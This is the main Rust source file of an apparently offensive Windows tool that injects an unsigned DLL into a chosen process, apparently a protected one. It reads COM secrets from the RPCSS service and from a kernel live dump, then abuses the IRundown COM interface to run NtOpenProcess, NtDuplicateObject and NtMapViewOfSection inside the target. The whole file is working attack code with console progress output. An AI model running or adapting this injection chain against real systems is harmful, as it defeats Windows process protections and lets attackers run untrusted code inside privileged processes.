use clap::Parser;
use endian_codec::DecodeLE;
use memmap2::Mmap;
use pe_parser::{pe::parse_portable_executable, section::SectionHeader};
use pplsystem::{
    dmp::dumper::create_dump_file,
    irundown::{
        inject::{
            call_ndr_server_call2, increment_and_read, init_remote_com_secret, set_call_args,
            write_data_to_address, write_rpc_message,
        },
        locate::locate_secret_and_context,
        rpcss::{locate_rpcss_oxid_list_head, CProcess, CServerOXID},
    },
    kdmp::{
        parser::{DmpParser, Parsable, PhysicalAddress, VirtualAddress},
        structs::_EPROCESS,
    },
};
use std::{
    fs::{self, File},
    mem::{offset_of, size_of},
    os::raw::c_void,
    process,
};
use std::mem::transmute_copy;
use sysinfo::System;
use windows::{
    core::{s, GUID, PCSTR},
    Wdk::{
        Foundation::OBJECT_ATTRIBUTES,
        Storage::FileSystem::NtCreateSection,
        System::SystemServices::{ViewShare, PAGE_READONLY},
    },
    Win32::{
        Foundation::{GENERIC_ALL, GENERIC_READ, HANDLE},
        Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING},
        System::{
            Com::{CoInitializeEx, COINIT_MULTITHREADED},
            Diagnostics::Debug::ReadProcessMemory,
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{SECTION_ALL_ACCESS, SEC_IMAGE},
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
            WindowsProgramming::CLIENT_ID,
        },
    },
};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Path of the (unsigned) DLL to inject
    #[arg(long)]
    dll: String,

    /// Where to write the livedump on disk (must be a full path)
    #[arg(long)]
    dump: String,

    /// Target PID to inject
    #[arg(long)]
    pid: u32,
}

fn main() {
    let args = Args::parse();

    let s = System::new_all();

    let mut rpcss_pid = 0;
    let target_pid;

    for process in s.processes_by_name("svchost") {
        if process.cmd().contains(&String::from("RPCSS")) {
            rpcss_pid = process.pid().as_u32();
        }
    }

    target_pid = args.pid;
    let dll_to_inject = args.dll;

    if rpcss_pid == 0 || target_pid == 0 {
        panic!("Could not find PID for rpcss or target PID is invalid");
    }

    let rpcss_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, rpcss_pid).unwrap() };

    let oxid_list_head = locate_rpcss_oxid_list_head().unwrap();

    let mut server_oxid_list_head: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_list_head.addr as *const c_void,
            &mut server_oxid_list_head as *mut u64 as *mut c_void,
            8,
            None,
        )
        .unwrap()
    };

    println!("[+] OID Server list addr: {:#X}", server_oxid_list_head);

    let mut number_of_oxid_entries: u32 = 0;

    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            server_oxid_list_head as *const c_void,
            &mut number_of_oxid_entries as *mut u32 as *mut c_void,
            4,
            None,
        )
        .unwrap()
    }

    println!("[+] Number of entries : {:#X}", number_of_oxid_entries);

    let mut oxid_array_address: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            (server_oxid_list_head + 8) as *const c_void,
            &mut oxid_array_address as *mut u64 as *mut c_void,
            8,
            None,
        )
        .unwrap()
    };

    println!("[+] OXID Array @ {:#X}", oxid_array_address);

    let mut oxid_array_data: Vec<u8> = vec![0; (number_of_oxid_entries * 8) as usize];

    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_array_address as *const c_void,
            oxid_array_data.as_mut_ptr() as *mut c_void,
            (number_of_oxid_entries * 8) as usize,
            None,
        )
        .unwrap()
    };

    let (_prefix, oxid_array_data,_suffix) = unsafe { oxid_array_data.align_to::<u64>() };

    let mut target_oxid = 0;
    let mut target_ipid = 0;

    unsafe { CoInitializeEx(None, COINIT_MULTITHREADED).unwrap() };

    for &oxid_entry_address in oxid_array_data {
        if oxid_entry_address != 0 {
            let mut cserver_oxid_entry = CServerOXID {
                padding: [0; 0x18],
                oxid: 0,
                cprocess: 0,
                padding2: [0; 0x38],
                ipid: 0,
            };

            unsafe {
                ReadProcessMemory(
                    rpcss_handle,
                    oxid_entry_address as *const c_void,
                    &mut cserver_oxid_entry as *mut CServerOXID as *mut c_void,
                    size_of::<CServerOXID>(),
                    None,
                )
                .unwrap()
            };

            let mut cprocess_entry = CProcess {
                pid: 0,
                padding: [0; 88],
            };

            unsafe {
                ReadProcessMemory(
                    rpcss_handle,
                    cserver_oxid_entry.cprocess as *const c_void,
                    &mut cprocess_entry as *mut CProcess as *mut c_void,
                    size_of::<CProcess>(),
                    None,
                )
                .unwrap()
            };

            if cprocess_entry.pid == target_pid {
                println!("[+] Found : PID - {:#?}", cprocess_entry.pid);
                println!("[+] Found : OXID - {:#X?}", cserver_oxid_entry.oxid);
                println!(
                    "[+] Found : IPID - {:#X?}",
                    GUID::from_u128(u128::from_be(cserver_oxid_entry.ipid))
                );

                target_ipid = cserver_oxid_entry.ipid;
                target_oxid = cserver_oxid_entry.oxid;

                let result = init_remote_com_secret(target_ipid, target_oxid);

                if result.is_err() && result.0 as u32 == 0x80070057 {
                    break;
                }

                //break;
            }
        }
    }

    if target_ipid == 0 || target_oxid == 0 {
        panic!("[-] Failed finding IPID or OXID for IRundown in target process. This is most likely due to the process not having initialized COM.");
    }

    let (secret_offset, context_offset) = locate_secret_and_context().unwrap();

    create_dump_file(args.dump.clone()).unwrap();

    let file = File::open(args.dump).expect("[-] Could not open livedump file.");

    let mmap = unsafe { Mmap::map(&file).expect("[-] Failed mapping livedump file to memory") };

    let buffer: &[u8] = &mmap;
    let dmp = DmpParser::from_buffer(buffer).unwrap();

    let data = dmp
        .read_virtual_memory(dmp.directory_table_base, dmp.ps_active_process_list, 0x8)
        .unwrap();

    let active_process_head = dmp.ps_active_process_list;

    let mut current_eprocess_addr = u64::from_le_bytes(data.try_into().unwrap())
        - offset_of!(_EPROCESS, ActiveProcessLinks) as u64;

    let mut current_eprocess = dmp
        .read_virtual_memory(
            dmp.directory_table_base,
            VirtualAddress::from(current_eprocess_addr),
            size_of::<_EPROCESS>(),
        )
        .unwrap();

    let mut eprocess;

    let target_directory_table_base;

    loop {
        eprocess = _EPROCESS::decode_from_le_bytes(&current_eprocess);

        if eprocess.UniqueProcessId == target_pid as u64 {
            target_directory_table_base = PhysicalAddress::from(eprocess.pcb.DirectoryTableBase);

            println!(
                "[+] Name : {}, PEB : {:#X}, Base {:#X}",
                String::from_utf8_lossy(&(eprocess.ImageFileName)),
                eprocess.Peb,
                eprocess.pcb.DirectoryTableBase
            );

            println!("[+] Found EPROCESS for target process");
            break;
        }

        if eprocess.ActiveProcessLinks.Flink as u64 == active_process_head.addr {
            panic!("[-] Did not find target pid in ActiveProcessList ");
        }

        current_eprocess_addr = eprocess.ActiveProcessLinks.Flink as u64
            - offset_of!(_EPROCESS, ActiveProcessLinks) as u64;

        current_eprocess = dmp
            .read_virtual_memory(
                dmp.directory_table_base,
                VirtualAddress::from(current_eprocess_addr),
                size_of::<_EPROCESS>(),
            )
            .unwrap();
    }

    println!(
        "[+] COM secret @ {:#X} - context @ {:#X}",
        secret_offset, context_offset
    );

    let com_secret = u128::from_le_bytes(
        dmp.read_virtual_memory(
            target_directory_table_base,
            VirtualAddress::from(secret_offset as u64),
            16,
        )
        .unwrap()
        .try_into()
        .unwrap(),
    );

    println!("[+] Remote COM secret : {:#X}", com_secret);

    let com_context = u64::from_le_bytes(
        dmp.read_virtual_memory(
            target_directory_table_base,
            VirtualAddress::from(context_offset as u64),
            8,
        )
        .unwrap()
        .try_into()
        .unwrap(),
    );

    println!("[+] Remote COM context : {:#X}", com_context);

    let rpcrt4_binary =
        fs::read(r"C:\windows\system32\rpcrt4.dll").expect("[-] Failed reading rpcrt4 from disk");
    let rpcrt4_pe =
        parse_portable_executable(rpcrt4_binary.as_slice()).expect("[-] Failed parsing rpcrt4.dll");

    let rpcrt_data: SectionHeader = rpcrt4_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("[-] Failed getting .data section for rpcrt4.dll")
        .clone();

    let kernel32_binary = fs::read(r"C:\windows\system32\kernel32.dll")
        .expect("[-] Failed reading kernel32 from disk");
    let kernel32_pe = parse_portable_executable(kernel32_binary.as_slice())
        .expect("[-] Failed parsing kernel32.dll");

    let kernel32_data: SectionHeader = kernel32_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("[-] Failed getting .data section for kernel32.dll")
        .clone();

    let ntdll_binary =
        fs::read(r"C:\windows\system32\ntdll.dll").expect("[-] Failed reading ntdll from disk");
    let ntdll_pe =
        parse_portable_executable(ntdll_binary.as_slice()).expect("[-] Failed parsing ntdll.dll");

    let ntdll_data: SectionHeader = ntdll_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("[-] Failed getting .data section for ntdll.dll")
        .clone();

    let win32u_binary =
        fs::read(r"C:\windows\system32\win32u.dll").expect("[-] Failed reading win32u from disk");
    let win32u_pe =
        parse_portable_executable(win32u_binary.as_slice()).expect("[-] Failed parsing win32u.dll");

    let win32u_data: SectionHeader = win32u_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("[-] Failed getting .data section for win32u.dll")
        .clone();

    let bcryptprimitives_binary = fs::read(r"C:\windows\system32\bcryptprimitives.dll")
        .expect("[-] Failed reading bcryptprimitives from disk");
    let bcryptprimitives_pe = parse_portable_executable(bcryptprimitives_binary.as_slice())
        .expect("[-] Failed parsing bcryptprimitives.dll");

    let bcryptprimitives_data: SectionHeader = bcryptprimitives_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("[-] Failed getting .data section for bcryptprimitives.dll")
        .clone();

    if ((rpcrt_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        panic!("[-] rpcrt4.dll .data section is too small. Please use another DLL.");
    }

    let start_address1 = unsafe { GetModuleHandleA(s!("rpcrt4\0")).unwrap().0 as u64 }
        + rpcrt_data.virtual_address as u64
        + rpcrt_data.virtual_size as u64;

    let arguments_address = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtOpenProcess"),
        )
        .unwrap() as u64
    };

    let message_addr = write_rpc_message(
        start_address1,
        arguments_address,
        target_function,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    let handle_to_self_rs_address =
        unsafe { GetModuleHandleA(s!("ntdll.dll\0")).unwrap().0 as u64 }
            + ntdll_data.virtual_address as u64
            + ntdll_data.virtual_size as u64;

    let remote_handle_to_section_address = handle_to_self_rs_address + 8;

    let mut obj_attr = OBJECT_ATTRIBUTES::default();
    obj_attr.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
    let obj_data: [u8; size_of::<OBJECT_ATTRIBUTES>()] = unsafe { transmute_copy(&obj_attr) };

    write_data_to_address(
        &obj_data,
        remote_handle_to_section_address + 8,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    let mut client_id = CLIENT_ID::default();
    client_id.UniqueProcess = HANDLE(process::id() as isize);
    let client_id_data: [u8; size_of::<CLIENT_ID>()] = unsafe { transmute_copy(&client_id) };
    write_data_to_address(
        &client_id_data,
        remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    set_call_args(
        [
            handle_to_self_rs_address,
            PROCESS_ALL_ACCESS.0 as u64,
            remote_handle_to_section_address + 8,
            remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
            0x4,
            0x5,
            0x6,
            0x7,
            0x8,
            0x9,
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    if ((bcryptprimitives_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        panic!("[-] bcryptprimitives.dll .data section is too small. Please use another DLL.");
    }

    let start_address2 =
        unsafe { GetModuleHandleA(s!("bcryptprimitives.dll\0")).unwrap().0 as u64 }
            + bcryptprimitives_data.virtual_address as u64
            + bcryptprimitives_data.virtual_size as u64;

    let arguments_address2 = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function2 = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtDuplicateObject"),
        )
        .unwrap() as u64
    };

    let message_addr2 = write_rpc_message(
        start_address2,
        arguments_address2,
        target_function2,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    let handle_to_rs = increment_and_read(
        handle_to_self_rs_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    ) - 1;

    println!("[+] Remote HANDLE to our process : {:#X}", handle_to_rs);

    let dll_handle = unsafe {
        CreateFileA(
            PCSTR(format!("{}\0", dll_to_inject).as_ptr()),
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
    };

    if dll_handle.is_err() {
        panic!();
    }

    let mut section_handle = HANDLE::default();
    let status = unsafe {
        NtCreateSection(
            &mut section_handle,
            SECTION_ALL_ACCESS.0,
            None,
            None,
            PAGE_READONLY,
            SEC_IMAGE.0,
            dll_handle.unwrap(),
        )
    };

    if status.is_err() {
        panic!();
    }

    set_call_args(
        [
            handle_to_rs,
            section_handle.0 as u64,
            u64::MAX, //
            remote_handle_to_section_address,
            GENERIC_ALL.0 as u64,
            0,
            0x0,
            0x7,
            0x8,
            0x9,
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr2,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    let remote_handle_to_section = increment_and_read(
        remote_handle_to_section_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    ) - 1;

    println!(
        "[+] Remote HANDLE to our section : {:#X}",
        remote_handle_to_section
    );

    if ((win32u_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        panic!("[-] win32u.dll .data section is too small. Please use another DLL.");
    }

    let start_address3 = unsafe { GetModuleHandleA(s!("win32u.dll\0")).unwrap().0 as u64 }
        + win32u_data.virtual_address as u64
        + win32u_data.virtual_size as u64;

    let arguments_address3 = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function3 = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtMapViewOfSection"),
        )
        .unwrap() as u64
    };

    let message_addr3 = write_rpc_message(
        start_address3,
        arguments_address3,
        target_function3,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    set_call_args(
        [
            remote_handle_to_section,       // SECTION HANDLE
            u64::MAX,                       // PROCESS HANDLE
            arguments_address3 + 0x200,     // PVOID* BaseAddres - FIXME
            4,                              // ZeroBits
            0,                              // ComitSize
            0,                              // optionnal SectionOffset
            arguments_address3 + 0x200 + 8, // ViewSize
            ViewShare.0 as u64,             // InheritDisposition
            0x0,                            // AllocationType
            0x2,                            // Win32Protect
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr3,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    println!("[+] Done!");
}
